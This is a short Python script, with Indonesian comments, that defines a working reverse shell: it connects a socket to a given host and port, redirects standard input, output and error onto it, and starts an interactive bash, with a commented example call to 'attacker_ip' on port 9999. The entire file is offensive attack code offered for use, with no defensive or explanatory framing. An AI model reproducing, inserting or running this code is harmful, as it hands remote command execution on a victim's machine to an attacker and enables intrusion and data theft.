import socket
import subprocess
import os

def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Mengarahkan stdin, stdout, dan stderr ke socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr

        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Reverse shell failed: {e}")

# Contoh penggunaan:
# reverse_shell("attacker_ip", 9999)
